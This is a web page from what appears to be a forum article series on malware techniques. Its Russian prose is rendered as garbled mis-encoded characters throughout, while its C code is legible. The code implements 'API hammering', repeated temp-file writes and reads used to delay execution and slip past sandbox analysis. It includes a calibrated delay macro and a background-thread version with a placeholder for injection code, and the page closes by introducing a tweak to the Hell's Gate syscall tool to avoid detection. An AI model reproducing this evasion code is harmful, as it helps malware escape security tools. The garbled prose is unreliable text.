–§—É–Ω–∫—Ü–∏—è ApiHammering –Ω–∏–∂–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –æ–ø–∏—Å–∞–Ω–Ω—ã–µ –≤—ã—à–µ —à–∞–≥–∏. –ï–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω—ã–º –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º, –∫–æ—Ç–æ—Ä—ã–π —Ç—Ä–µ–±—É–µ—Ç—Å—è –¥–ª—è —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏, —è–≤–ª—è–µ—Ç—Å—è dwStress, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏–π –≤—Å–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
–û—Å—Ç–∞–ª—å–Ω–æ–π –∫–æ–¥ –¥–æ–ª–∂–µ–Ω –≤—ã–≥–ª—è–¥–µ—Ç—å –∑–Ω–∞–∫–æ–º–æ, –∑–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI GetTempPathW, –∫–æ—Ç–æ—Ä–∞—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—É—Ç–∏ –∫ –ø–∞–ø–∫–µ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ C:\Users&lt;username&gt;\AppData\Local\Temp. –ó–∞—Ç–µ–º –∫ —ç—Ç–æ–º—É –ø—É—Ç–∏ –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è –∏–º—è —Ñ–∞–π–ª–∞ TMPFILE, –∏ –æ–Ω–æ –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–∏ CreateFileW.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ò–º—è —Ñ–∞–π–ª–∞ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è
#define TMPFILE L&quot;RuSfera.tmp&quot;

BOOL ApiHammering(DWORD dwStress) {

    WCHAR     szPath                  [MAX_PATH * 2],
              szTmpPath               [MAX_PATH];
    HANDLE    hRFile                  = INVALID_HANDLE_VALUE,
              hWFile                  = INVALID_HANDLE_VALUE;

    DWORD   dwNumberOfBytesRead       = NULL,
            dwNumberOfBytesWritten    = NULL;

    PBYTE   pRandBuffer               = NULL;
    SIZE_T  sBufferSize               = 0xFFFFF;    // 1048575 –±–∞–π—Ç

    INT     Random                    = 0;

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –ø—É—Ç–∏ –∫ –≤—Ä–µ–º–µ–Ω–Ω–æ–π –ø–∞–ø–∫–µ
    if (!GetTempPathW(MAX_PATH, szTmpPath)) {
        printf(&quot;[!] GetTempPathW –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –°–æ–∑–¥–∞–Ω–∏–µ –ø—É—Ç–∏ –∫ —Ñ–∞–π–ª—É
    wsprintfW(szPath, L&quot;%s%s&quot;, szTmpPath, TMPFILE);

    for (SIZE_T i = 0; i &lt; dwStress; i++){

        // –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ –≤ —Ä–µ–∂–∏–º–µ –∑–∞–ø–∏—Å–∏
        if ((hWFile = CreateFileW(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
            printf(&quot;[!] CreateFileW –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
            return FALSE;
        }

        // –í—ã–¥–µ–ª–µ–Ω–∏–µ –±—É—Ñ–µ—Ä–∞ –∏ –∑–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –µ–≥–æ —Å–ª—É—á–∞–π–Ω—ã–º –∑–Ω–∞—á–µ–Ω–∏–µ–º
        pRandBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufferSize);
        Random = rand() % 0xFF;
        memset(pRandBuffer, Random, sBufferSize);

        // –ó–∞–ø–∏—Å—å —Å–ª—É—á–∞–π–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤ —Ñ–∞–π–ª
        if (!WriteFile(hWFile, pRandBuffer, sBufferSize, &amp;dwNumberOfBytesWritten, NULL) || dwNumberOfBytesWritten != sBufferSize) {
            printf(&quot;[!] WriteFile –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
            printf(&quot;[i] –ó–∞–ø–∏—Å–∞–Ω–æ %d –±–∞–π—Ç –∏–∑ %d \n&quot;, dwNumberOfBytesWritten, sBufferSize);
            return FALSE;
        }

        // –û—á–∏—Å—Ç–∫–∞ –±—É—Ñ–µ—Ä–∞ –∏ –∑–∞–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ñ–∞–π–ª–∞
        RtlZeroMemory(pRandBuffer, sBufferSize);
        CloseHandle(hWFile);

        // –û—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–∞ –≤ —Ä–µ–∂–∏–º–µ —á—Ç–µ–Ω–∏—è –∏ —É–¥–∞–ª–µ–Ω–∏–µ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏
        if ((hRFile = CreateFileW(szPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
            printf(&quot;[!] CreateFileW –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
            return FALSE;
        }

        // –ß—Ç–µ–Ω–∏–µ —Ä–∞–Ω–µ–µ –∑–∞–ø–∏—Å–∞–Ω–Ω—ã—Ö —Å–ª—É—á–∞–π–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        if (!ReadFile(hRFile, pRandBuffer, sBufferSize, &amp;dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != sBufferSize) {
            printf(&quot;[!] ReadFile –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
            printf(&quot;[i] –ü—Ä–æ—á–∏—Ç–∞–Ω–æ %d –±–∞–π—Ç –∏–∑ %d \n&quot;, dwNumberOfBytesRead, sBufferSize);
            return FALSE;
        }

        // –û—á–∏—Å—Ç–∫–∞ –±—É—Ñ–µ—Ä–∞ –∏ –µ–≥–æ –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ
        RtlZeroMemory(pRandBuffer, sBufferSize);
        HeapFree(GetProcessHeap(), NULL, pRandBuffer);

        // –ó–∞–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ñ–∞–π–ª–∞ - —É–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞
        CloseHandle(hRFile);
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ó–∞–¥–µ—Ä–∂–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å –ø–æ–º–æ—â—å—é API Hammering</b><br />
<br />
–ß—Ç–æ–±—ã –∑–∞–¥–µ—Ä–∂–∞—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å –ø–æ–º–æ—â—å—é API Hammering, –≤—ã—á–∏—Å–ª–∏—Ç–µ, —Å–∫–æ–ª—å–∫–æ –≤—Ä–µ–º–µ–Ω–∏ —Ç—Ä–µ–±—É–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–∏ ApiHammering –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ —á–∏—Å–ª–∞ —Ü–∏–∫–ª–æ–≤. –î–ª—è —ç—Ç–æ–≥–æ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ—É–Ω–∫—Ü–∏—é GetTickCount64 WinAPI –¥–ª—è –∏–∑–º–µ—Ä–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏ –¥–æ –∏ –ø–æ—Å–ª–µ –≤—ã–∑–æ–≤–∞ ApiHammering. –í —ç—Ç–æ–º –ø—Ä–∏–º–µ—Ä–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ü–∏–∫–ª–æ–≤ —Å–æ—Å—Ç–∞–≤–∏—Ç 1000.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    DWORD    T0    = NULL,
            T1    = NULL;

    T0 = GetTickCount64();

    if (!ApiHammering(1000)) {
        return -1;
    }

    T1 = GetTickCount64();

    printf(&quot;&gt;&gt;&gt; ApiHammering(1000) –ó–∞–Ω—è–ª–æ : %d –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è \n&quot;, (DWORD)(T1 - T0));

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –≤—ã–π—Ç–∏ ... &quot;);
    getchar();

    return 0;
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746787449191.png"
		data-src="https://osint42.org/attachments/1746787449191-png.253/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787449191-png.253/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787449191.png"
			title="1746787449191.png"
			width="1345" height="111" loading="lazy" />
	</div><br />
<br />
–í—ã–≤–æ–¥ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ 1000 —Ü–∏–∫–ª–æ–≤ —Ç—Ä–µ–±—É—é—Ç –ø—Ä–∏–º–µ—Ä–Ω–æ 5.1 —Å–µ–∫—É–Ω–¥—ã –Ω–∞ —Ç–µ–∫—É—â–µ–π –º–∞—à–∏–Ω–µ. –≠—Ç–æ —á–∏—Å–ª–æ –Ω–µ–º–Ω–æ–≥–æ –±—É–¥–µ—Ç –æ—Ç–ª–∏—á–∞—Ç—å—Å—è –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏—Ö —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫ —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã.<br />
<br />
<b>–ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ —Å–µ–∫—É–Ω–¥ –≤ —Ü–∏–∫–ª—ã</b><br />
<br />
–ú–∞–∫—Ä–æ—Å SECTOSTRESS, –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ, –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —Å–µ–∫—É–Ω–¥, i, –≤ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ü–∏–∫–ª–æ–≤. –ü–æ—Å–∫–æ–ª—å–∫—É 1000 —Ü–∏–∫–ª–æ–≤ –∑–∞–Ω–∏–º–∞—é—Ç 5.157 —Å–µ–∫—É–Ω–¥, –æ–¥–Ω–∞ —Å–µ–∫—É–Ω–¥–∞ –±—É–¥–µ—Ç –∑–∞–Ω–∏–º–∞—Ç—å 1000 / 5.157 = 194 —Ü–∏–∫–ª–∞. –†–µ–∑—É–ª—å—Ç–∞—Ç –º–∞–∫—Ä–æ—Å–∞ —Å–ª–µ–¥—É–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–∏ ApiHammering.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define SECTOSTRESS(i) ((int)i * 194)</code></pre>
	</div>
</div><br />
<b>–ó–∞–¥–µ—Ä–∂–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å –ø–æ–º–æ—â—å—é –∫–æ–¥–∞ API Hammering</b><br />
<br />
–§—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –Ω–∏–∂–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –≥–ª–∞–≤–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é, –∏—Å–ø–æ–ª—å–∑—É—é—â—É—é —Ä–∞–Ω–µ–µ —É–ø–æ–º—è–Ω—É—Ç—É—é —Ç–µ—Ö–Ω–∏–∫—É.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

  DWORD T0  = NULL,
        T1  = NULL;

  T0 = GetTickCount64();

  // –ó–∞–¥–µ—Ä–∂–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –Ω–∞ &#039;5&#039; —Å–µ–∫—É–Ω–¥ –ø–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤—É —Ü–∏–∫–ª–æ–≤
  if (!ApiHammering(SECTOSTRESS(5))) {
    return -1;
  }

  T1 = GetTickCount64();

  printf(&quot;&gt;&gt;&gt; ApiHammering –∑–∞–¥–µ—Ä–∂–∞–ª –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–∞ : %d \n&quot;, (DWORD)(T1 - T0));

  printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –≤—ã–π—Ç–∏ ... &quot;);
  getchar();

  return 0;
}</code></pre>
	</div>
</div><br />
<b>API Hammering –≤ –ø–æ—Ç–æ–∫–µ </b><br />
<br />
–§—É–Ω–∫—Ü–∏—é ApiHammering –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤ –ø–æ—Ç–æ–∫–µ, –∫–æ—Ç–æ—Ä—ã–π —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ –¥–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞. –î–ª—è —ç—Ç–æ–≥–æ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é CreateThread –∏–∑ WinAPI. –§—É–Ω–∫—Ü–∏–∏ ApiHammering —Å–ª–µ–¥—É–µ—Ç –ø–µ—Ä–µ–¥–∞—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ -1, —á—Ç–æ –∑–∞—Å—Ç–∞–≤–∏—Ç –µ–µ –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –≤ –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ–º —Ü–∏–∫–ª–µ.<br />
<br />
–ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –ø–æ–∫–∞–∑–∞–Ω–Ω–∞—è –Ω–∏–∂–µ, —Å–æ–∑–¥–∞–µ—Ç –Ω–æ–≤—ã–π –ø–æ—Ç–æ–∫ –∏ –≤—ã–∑—ã–≤–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é ApiHammering —Å–æ –∑–Ω–∞—á–µ–Ω–∏–µ–º -1.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    DWORD dwThreadId = NULL;

    if (!CreateThread(NULL, NULL, ApiHammering, (LPVOID)-1, NULL, &amp;dwThreadId)) {
        printf(&quot;[!] CreateThread –∑–∞–≤–µ—Ä—à–∏–ª–æ—Å—å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
        return -1;
    }

    printf(&quot;[+] –ü–æ—Ç–æ–∫ %d –±—ã–ª —Å–æ–∑–¥–∞–Ω –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è ApiHammering –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ\n&quot;, dwThreadId);

    /*

        –ú–µ—Å—Ç–æ –¥–ª—è –≤—Å—Ç–∞–≤–∫–∏ –∫–æ–¥–∞ –∏–Ω—ä–µ–∫—Ü–∏–∏

    */

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –≤—ã–π—Ç–∏ ... &quot;);
    getchar();

    return 0;
}</code></pre>
	</div>
</div></div>
						

							<h2>–û—Ç–∫—Ä—ã–≤–∞–µ–º –≤—Ä–∞—Ç–∞ –∞–¥–∞</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746787685671.png"
		data-src="https://osint42.org/attachments/1746787685671-png.254/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787685671-png.254/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787685671.png"
			title="1746787685671.png"
			width="600" height="352" loading="lazy" />
	</div><br />
<br />
–í —ç—Ç–∏—Ö —Ç–µ–º–∞—Ö:<br />
<br />


<div class="embed fauxBlockLink" data-embed-content="ams_page-29" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/predel-naya-tekhnika-razborka-s-siskolami.29/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="page/predel-naya-tekhnika-razborka-s-siskolami.29/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../data/attachments/0/197-ec0391203463a22d22f1237ee738d6770e2b.jpg?hash=5UksgehQuL' loading='lazy' width='150' height='150' alt='–ü—Ä–µ–¥–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞. –†–∞–∑–±–æ—Ä–∫–∞ —Å —Å–∏—Å–∫–æ–ª–∞–º–∏' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="page/predel-naya-tekhnika-razborka-s-siskolami.29/index.html"> –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot; - –ü—Ä–µ–¥–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞. –†–∞–∑–±–æ—Ä–∫–∞ —Å —Å–∏—Å–∫–æ–ª–∞–º–∏</a>
				</h3>

				<div class="contentRow-snippet">
					–ß—Ç–æ —Ç–∞–∫–æ–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã (Syscalls)

–°–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã Windows –∏–ª–∏ syscalls —Å–ª—É–∂–∞—Ç –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–º –¥–ª—è –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è –ø—Ä–æ–≥—Ä–∞–º–º —Å —Å–∏—Å—Ç–µ–º–æ–π, –ø–æ–∑–≤–æ–ª—è—è –∏–º –∑–∞–ø—Ä–∞—à–∏–≤–∞—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ —É—Å–ª—É–≥–∏, —Ç–∞–∫–∏–µ –∫–∞–∫ —á—Ç–µ–Ω–∏–µ –∏–ª–∏ –∑–∞–ø–∏—Å—å –≤ —Ñ–∞–π–ª, —Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–ª–∏ –≤—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏.

–ü–æ–º–Ω–∏—Ç–µ –∏–∑ –≤–≤–æ–¥–Ω—ã—Ö –º–æ–¥—É–ª–µ–π, —á—Ç–æ...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T13:14:25+0300" data-timestamp="1746785665" data-date="09.05.2025" data-time="13:14" data-short="9 –ú–∞–π" title="09.05.2025 –≤ 13:14">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div>

<div class="embed fauxBlockLink" data-embed-content="ams_page-30" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../data/attachments/0/227-617ec7b35374fc4fb82dd47ecbdb78dc2104.jpg?hash=aos6xYS5-8' loading='lazy' width='267' height='150' alt='–ü—Ä–µ–¥–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞-2. –ü—Ä–∞–∫—Ç–∏–∫–∞. –†–µ–∞–ª–∏–∑—É–µ–º —Ç–µ—Ö–Ω–∏–∫–∏ –∏–Ω—ä–µ–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ —Å–∏—Å–∫–æ–ª—ã' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/index.html"> –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot; - –ü—Ä–µ–¥–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞-2. –ü—Ä–∞–∫—Ç–∏–∫–∞. –†–µ–∞–ª–∏–∑—É–µ–º —Ç–µ—Ö–Ω–∏–∫–∏ –∏–Ω—ä–µ–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ —Å–∏—Å–∫–æ–ª—ã</a>
				</h3>

				<div class="contentRow-snippet">
					–í –ø—Ä–æ—à–ª–æ–π —Å—Ç–∞—Ç—å–µ:–ü—Ä–µ–¥–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞. –†–∞–∑–±–æ—Ä–∫–∞ —Å —Å–∏—Å–∫–æ–ª–∞–º–∏ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot; –º—ã —Ä–∞–∑–æ–±—Ä–∞–ª–∏ —Ç–µ–æ—Ä–∏—é.

–î–∞–≤–∞–π—Ç–µ —Ç–µ–ø–µ—Ä—å –ø–µ—Ä–µ–¥–µ–ª–∞–µ–º —Ç–µ—Ö–Ω–∏–∫–∏:

https://osint42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/izuchayem-tekhniku-thread-hijacking.18/...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T13:28:08+0300" data-timestamp="1746786488" data-date="09.05.2025" data-time="13:28" data-short="9 –ú–∞–π" title="09.05.2025 –≤ 13:28">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div><br />
–ú—ã –æ–±—Å—É–∂–¥–∞–ª–∏ –ø—Ä—è–º—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –¥–ª—è –æ–±—Ö–æ–¥–∞ —Ö—É–∫–æ–≤ –∏ –¥–µ—Ç–µ–∫—Ç–∞ –ø–æ –ø–æ–≤–µ–¥–µ–Ω–∏—é.<br />
<br />
–ú—ã —Ç–∞–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç Hell&#039;s Gate, –ø—Ä–µ–¥–ª–∞–≥–∞—é –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å —ç—Ç–æ—Ç –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —á—Ç–æ-–±—ã –∏–∑–±–µ–∂–∞—Ç—å –¥–µ—Ç–µ–∫—Ç –Ω–∞ —Å–∞–º –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç.)<br />
<br />
